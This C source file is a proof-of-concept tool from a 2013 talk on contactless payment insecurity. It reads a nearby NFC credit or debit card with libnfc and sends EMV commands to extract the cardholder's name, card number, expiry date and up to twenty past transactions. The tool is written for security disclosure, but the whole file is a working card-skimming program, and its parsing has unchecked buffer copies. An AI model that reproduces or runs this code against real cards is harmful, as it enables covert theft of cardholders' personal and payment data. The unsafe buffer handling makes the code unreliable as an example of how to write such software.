/*

readnfccc 2.0 - by Renaud Lifchitz (renaud.lifchitz@oppida.fr)
License: distributed under GPL version 3 (http://www.gnu.org/licenses/gpl.html)

* Introduction:
"Quick and dirty" proof-of-concept
Open source tool developped and showed for 8dot8 2013 in Santiago, Chile - "Contacless payments insecurity"
SPANISH VERSION
Reads NFC credit card personal data (gender, first name, last name, PAN, expiration date, transaction history...)
Designed to works on French CB debit cards. Needs modifications to work for other cards.

* Requirements:
libnfc (>= 1.7.0-rc7) and a suitable NFC reader (http://nfc-tools.org/index.php?title=Devices_compatibility_matrix)

* Compilation:
$ gcc readnfccc.c -lnfc -o readnfccc

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <nfc/nfc.h>

// Choose whether to mask the PAN or not
#define MASKED 1

#define MAX_FRAME_LEN 300

void show(size_t recvlg, uint8_t *recv)
{
  int i;
  printf("< ");
  for (i = 0; i < (int) recvlg; i++) {
    printf("%02x ", (unsigned int) recv[i]);
  }
  printf("\n");
}

int main(int argc, char **argv)
{
  nfc_context *context;
  nfc_device *pnd;
  nfc_target nt;
  uint8_t abtRx[MAX_FRAME_LEN];
  uint8_t abtTx[MAX_FRAME_LEN];
  size_t szRx = sizeof(abtRx);
  size_t szTx;

  uint8_t SELECT_APP[] = {0x00, 0xA4, 0x04, 0x00, 0x07, 0xA0, 0x00, 0x00, 0x00, 0x42, 0x10, 0x10, 0x00};
  uint8_t READ_RECORD_VISA[] = {0x00, 0xB2, 0x02, 0x0C, 0x00, 0x00};
  uint8_t READ_RECORD_MC[] = {0x00, 0xB2, 0x01, 0x14, 0x00, 0x00};
  uint8_t READ_PAYLOG_VISA[] = {0x00, 0xB2, 0x01, 0x8C, 0x00, 0x00};
  uint8_t READ_PAYLOG_MC[] = {0x00, 0xB2, 0x01, 0x5C, 0x00, 0x00};

  unsigned char *res, output[50], c, amount[10], msg[100];
  unsigned int i, j, expiry;

  nfc_init(&context);
  if (context == NULL) {
    printf("Unable to init libnfc (malloc)");
    exit(EXIT_FAILURE);
  }
  const char *acLibnfcVersion = nfc_version();
  //printf("Using libnfc %s\n", acLibnfcVersion);
  pnd = nfc_open(context, NULL);
  if (pnd == NULL) {
    printf("Error opening NFC reader");
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }

  if (nfc_initiator_init(pnd) < 0) {
    nfc_perror(pnd, "nfc_initiator_init");
    nfc_close(pnd);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  };
  //printf("NFC reader: %s opened\n", nfc_device_get_name(pnd));

  int result;
  const nfc_modulation nm = {
    .nmt = NMT_ISO14443A,
    .nbr = NBR_106,
  };
  if (nfc_initiator_select_passive_target(pnd, nm, NULL, 0, &nt) <= 0) {
    nfc_perror(pnd, "START_14443A");
    return(1);
  }

  if ((result = nfc_initiator_transceive_bytes(pnd, SELECT_APP, sizeof(SELECT_APP), abtRx, sizeof(abtRx), 500)) < 0) {
    nfc_perror(pnd, "SELECT_APP");
    return(1);
  }
  //show(result, abtRx);

  if ((result = nfc_initiator_transceive_bytes(pnd, READ_RECORD_VISA, sizeof(READ_RECORD_VISA), abtRx, sizeof(abtRx), 500)) < 0) {
    nfc_perror(pnd, "READ_RECORD");
    return(1);
  }
  //show(result, abtRx);

  /* Look for cardholder name */
  res = abtRx;
  for (i = 0; i < (unsigned int) result - 1; i++) {
    if (*res == 0x5f && *(res + 1) == 0x20) {
      strncpy(output, res + 3, (int) * (res + 2));
      output[(int) * (res + 2)] = 0;
      printf("Nombre del titular : %s\n", output);
      break;
    }
    res++;
  }

  /* Look for PAN & Expiry date */
  res = abtRx;
  for (i = 0; i < (unsigned int) result - 1; i++) {
    if (*res == 0x4d && *(res + 1) == 0x57) {
      strncpy(output, res + 3, 13);
      output[11] = 0;
      printf("Número de la tarjeta :");

      for (j = 0; j < 8; j++) {
        if (j % 2 == 0) printf(" ");
        c = output[j];
        if (MASKED &j >= 2 & j <= 5) {
          printf("**");
        } else {
          printf("%02x", c & 0xff);
        }
      }
      printf("\n");
      expiry = (output[10] + (output[9] << 8) + (output[8] << 16)) >> 4;
      printf("Fecha de caducidad : %02x/20%02x\n\n", (expiry & 0xff), ((expiry >> 8) & 0xff));
      break;
    }
    res++;
  }

  if ((result = nfc_initiator_transceive_bytes(pnd, READ_RECORD_MC, sizeof(READ_RECORD_MC), abtRx, sizeof(abtRx), 500)) < 0) {
    nfc_perror(pnd, "READ_RECORD");
    return(1);
  }
  //show(result, abtRx);

  /* Look for cardholder name */
  res = abtRx;
  for (i = 0; i < (unsigned int) result - 1; i++) {
    if (*res == 0x5f && *(res + 1) == 0x20) {
      strncpy(output, res + 3, (int) * (res + 2));
      output[(int) * (res + 2)] = 0;
      printf("Nombre del titular : %s\n", output);
      break;
    }
    res++;
  }

  /* Look for PAN & Expiry date */
  res = abtRx;
  for (i = 0; i < (unsigned int) result - 1; i++) {
    if (*res == 0x9c && *(res + 1) == 0x57) {
      strncpy(output, res + 3, 13);
      output[11] = 0;
      printf("Número de la tarjeta :");

      for (j = 0; j < 8; j++) {
        if (j % 2 == 0) printf(" ");
        c = output[j];
        if (MASKED &j >= 2 & j <= 5) {
          printf("**");
        } else {
          printf("%02x", c & 0xff);
        }
      }
      printf("\n");
      expiry = (output[10] + (output[9] << 8) + (output[8] << 16)) >> 4;
      printf("Fecha de caducidad : %02x/20%02x\n\n", (expiry & 0xff), ((expiry >> 8) & 0xff));
      break;
    }
    res++;
  }


  for (i = 1; i <= 20; i++) {
    READ_PAYLOG_VISA[2] = i;
    if ((result = nfc_initiator_transceive_bytes(pnd, READ_PAYLOG_VISA, sizeof(READ_PAYLOG_VISA), abtRx, sizeof(abtRx), 500)) < 0) {
      nfc_perror(pnd, "READ_RECORD");
      return(1);
    }
    if (result == 17) { // Non-empty transaction
      //show(result, abtRx);
      res = abtRx;

      /* Look for date */
      sprintf(msg, "%02x/%02x/20%02x", res[13], res[12], res[11]);

      /* Look for transaction type */
      if (res[14] == 0) {
        sprintf(msg, "%s %s", msg, "Pago\t");
      } else if (res[14] == 1) {
        sprintf(msg, "%s %s", msg, "Retiro");
      }

      /* Look for amount*/
      sprintf(amount, "%02x%02x%02x", res[2], res[3], res[4]);
      sprintf(msg, "%s\t%d,%02x€", msg, atoi(amount), res[5]);

      printf("%s\n", msg);
    }
  }

  for (i = 1; i <= 20; i++) {
    READ_PAYLOG_MC[2] = i;
    if ((result = nfc_initiator_transceive_bytes(pnd, READ_PAYLOG_MC, sizeof(READ_PAYLOG_MC), abtRx, sizeof(abtRx), 500)) < 0) {
      nfc_perror(pnd, "READ_RECORD");
      return(1);
    }
    if (result == 17) { // Non-empty transaction
      //show(result, abtRx);
      res = abtRx;

      /* Look for date */
      sprintf(msg, "%02x/%02x/20%02x", res[13], res[12], res[11]);

      /* Look for transaction type */
      if (res[14] == 0) {
        sprintf(msg, "%s %s", msg, "Pago\t");
      } else if (res[14] == 1) {
        sprintf(msg, "%s %s", msg, "Retiro");
      }

      /* Look for amount*/
      sprintf(amount, "%02x%02x%02x", res[2], res[3], res[4]);
      sprintf(msg, "%s\t%d,%02x€", msg, atoi(amount), res[5]);

      printf("%s\n", msg);
    }
  }

  nfc_close(pnd);
  nfc_exit(context);

  return(0);
}


